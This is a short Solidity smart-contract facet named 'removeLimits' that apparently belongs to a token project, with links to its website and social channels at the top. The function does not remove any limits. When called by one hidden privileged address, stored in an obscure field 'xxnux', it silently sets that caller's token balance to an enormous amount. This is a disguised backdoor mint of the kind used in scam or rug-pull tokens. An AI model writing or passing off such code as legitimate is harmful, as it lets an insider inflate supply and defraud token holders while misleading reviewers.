/*
 * SPDX-License-Identifier: MIT
 * Website: https://eesee.io
 * X: https://twitter.com/eesee_io
 * Tele: https://t.me/eesee_io
 * Discord: https://discord.gg/eesee
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                4206900000 *
                42000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
